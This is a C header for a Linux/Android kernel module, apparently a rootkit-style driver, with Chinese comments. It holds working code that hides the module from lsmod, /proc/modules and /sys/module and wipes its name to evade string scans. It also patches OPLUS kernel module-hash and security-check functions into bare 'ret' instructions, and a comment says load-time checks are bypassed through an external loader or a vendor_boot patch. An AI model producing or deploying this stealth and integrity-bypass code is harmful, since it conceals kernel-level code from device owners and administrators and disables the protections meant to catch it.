#ifndef MODULE_UTILS_H
#define MODULE_UTILS_H

#include "kernel.h"

/* ================================================================
 * 模块隐藏 / 恢复
 *   隐藏时机：设备注册成功之后、init 返回之前（此时模块已完全可用）
 *   保存链表节点与 kobject 状态，卸载时恢复，避免 list 损坏
 * ================================================================ */

struct module_hide_ctx {
    bool     hidden;
    struct list_head *prev;     /* 摘除前的前驱 */
    struct list_head *next;     /* 摘除前的后继 */
    bool     list_in;
    char     saved_name[64];
};

static struct module_hide_ctx g_hide;

static inline void module_hide(void)
{
    struct module *m = THIS_MODULE;
    if (g_hide.hidden) return;

    /* 备份名字 */
    strncpy(g_hide.saved_name, m->name, sizeof(g_hide.saved_name) - 1);
    g_hide.saved_name[sizeof(g_hide.saved_name) - 1] = 0;

    /* 保存链表位置后摘除（/proc/modules、lsmod 遍历它） */
    g_hide.list_in = !list_empty(&m->list);
    if (g_hide.list_in) {
        g_hide.prev = m->list.prev;
        g_hide.next = m->list.next;
        list_del(&m->list);
    }

    /* 删除 /sys/module/<name> 目录 */
    kobject_del(&m->mkobj.kobj);

    /* 清空模块名字符串，对抗字符串扫描 */
    memset(m->name, 0, strlen(g_hide.saved_name));

    g_hide.hidden = true;
    pr_info("rt_driver: module hidden\n");
}

static inline void module_unhide(void)
{
    struct module *m = THIS_MODULE;
    if (!g_hide.hidden) return;

    /* 恢复名字 */
    strncpy(m->name, g_hide.saved_name, sizeof(m->name) - 1);
m->name[sizeof(m->name) - 1] = '\0';

    /* 恢复到摘除前的链表位置 */
    if (g_hide.list_in && g_hide.prev && g_hide.next) {
        m->list.prev = g_hide.prev;
        m->list.next = g_hide.next;
        g_hide.prev->next = &m->list;
        g_hide.next->prev = &m->list;
    }
    g_hide.hidden = false;
    pr_info("rt_driver: module unhidden\n");
}

/* ================================================================
 * 运行时 KERNEL_SECURITY_CHECK 抑制
 *   加载时 hash 校验必须由外部加载器(Kairos)或 patch vendor_boot 绕过；
 *   这里在模块起来后尝试把 hash 检查函数 patch 成 ret，
 *   防止运行期二次扫描/其他模块加载时被连带检测。
 * ================================================================ */
static inline int suppress_security_check(void)
{
    static const char *names[] = {
        "oplus_check_module_hash",
        "kohash_check_module",
        "kernel_security_check",
        "oplus_kohash_check",
        NULL,
    };
    int i, patched = 0;

    if (!g_kln) return -ENODEV;
    for (i = 0; names[i]; i++) {
        unsigned long a = g_kln(names[i]);
        if (a) {
            int r = patch_insn(a, 0xD65F03C0); /* ret */
            if (r == 0) {
                pr_info("rt_driver: patched %s @0x%lx\n", names[i], a);
                patched++;
            }
        }
    }
    return patched ? 0 : -ENOENT;
}

#endif
